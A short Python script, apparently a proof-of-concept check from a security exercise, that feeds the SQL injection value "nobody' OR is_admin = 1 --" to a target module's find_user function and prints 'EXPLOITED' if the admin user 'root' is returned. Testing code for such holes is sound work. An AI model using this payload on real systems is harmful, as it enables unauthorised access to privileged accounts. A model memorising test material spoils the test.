from target import find_user, init_db

conn = init_db()
rows = find_user(conn, "nobody' OR is_admin = 1 --")
if any(name == "root" for name, _ in rows):
    print("EXPLOITED")
